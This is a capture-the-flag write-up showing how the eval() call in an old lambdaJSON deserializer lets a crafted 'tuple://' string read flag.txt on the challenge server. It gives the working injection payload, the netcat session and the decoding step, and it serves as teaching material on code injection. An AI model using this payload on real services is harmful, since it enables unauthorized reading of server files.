# Rocket Science - Solution

**Author**: zeyu2001

**Category**: Pwn

Vulnerability in [lambdaJSON](https://pypi.org/project/lambdaJSON/)

Version 0.1.5 [fixes](https://github.com/pouya-eghbali/lambdaJSON/commit/0d3bcb8bf3388c90819f0f24c9865bc8d4d8b91e#diff-fbf3e360906b992a9c0fa6a63e4b5d3da7cc8b39fedd415697bb15d68c17f4f6) an insecure `eval()` vulnerability, replacing `eval()` with `ast.literal_eval()`.

`ast.literal_eval()` only considers a small subset of Python's syntax to be valid. Detailed explanation can be found [here](https://stackoverflow.com/questions/15197673/using-pythons-eval-vs-ast-literal-eval).

By inspecting the source code, we find that the `restore` function in `deserialize` uses `eval()`.

```python
restore = lambda obj:          (isinstance(obj, str) 
                        and    (lambda x: x.startswith('bytes://') 
                        and    bytes(x[8:], encoding = 'utf8') 
                        or     x.startswith('int://') 
                        and    int(x[6:]) 
                        or     x.startswith('float://') 
                        and    float(x[8:])
                        or     x.startswith('long://') 
                        and    long(x[7:])
                        or     x.startswith('bool://') 
                        and    eval(x[7:]) 
                        or     x.startswith('complex://')
                        and    complex(x[10:])
                        or     x.startswith('tuple://') 
                        and    eval(x[8:]) or x)(obj) 
                        or     isinstance(obj, list) 
                        and    [restore(i) for i in obj] 
                        or     isinstance(obj, dict) 
                        and    {restore(i):restore(obj[i]) for i in obj} 
                        or     obj)
```

The only other obstacle left is the fact that the deserialized object must be a tuple and all elements of the tuple must be integers.
```
➜  ~ nc 127.0.0.1 50000

                                       _,'/
                                  _.-''._:
                          ,-:`-.-'    .:.|
                         ;-.''       .::.|
          _..------.._  / (:.       .:::.|
       ,'.   .. . .  .`/  : :.     .::::.|
     ,'. .    .  .   ./    \ ::. .::::::.|
   ,'. .  .    .   . /      `.,,::::::::.;\
  /  .            . /       ,',';_::::::,:_:
 / . .  .   .      /      ,',','::`--'':;._;
: .             . /     ,',',':::::::_:'_,'
|..  .   .   .   /    ,',','::::::_:'_,'
|.              /,-. /,',':::::_:'_,'
| ..    .    . /) /-:/,'::::_:',-'
: . .     .   // / ,'):::_:',' ;
 \ .   .     // /,' /,-.','  ./
  \ . .  `::./,// ,'' ,'   . /
   `. .   . `;;;,/_.'' . . ,'
    ,`. .   :;;' `:.  .  ,'
   /   `-._,'  ..  ` _.-'
  (     _,'``------''
   `--''

Welcome to Rocket Science! In this class, we will learn all about rockets.
For our first lesson, we will start with the basics of mathematics.
1) Test your knowledge
2) Save numbers
3) Load numbers
> 3
Enter saved numbers:
> "tuple://(int.from_bytes(open('flag.txt').read().encode(), byteorder='big'), 2)"
(3969309506657081582967368110556498469050796930805813227720771571473136717745745293677237528859886779701434271164439572744813346302117987974410, 2)
```

After obtaining the number, we can then use `long_to_bytes` to get the flag.

```
➜  ~ python3
Python 3.9.5 (default, May  4 2021, 03:36:27)
[Clang 12.0.0 (clang-1200.0.32.29)] on darwin
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> long_to_bytes(3969309506657081582967368110556498469050796930805813227720771571473136717745745293677237528859886779701434271164439572744813346302117987974410)
b'STC{3v4l_1s_3v1l_00e80002e832f357cf5c05ee114a5cb40e746757}\n'
>>>
```
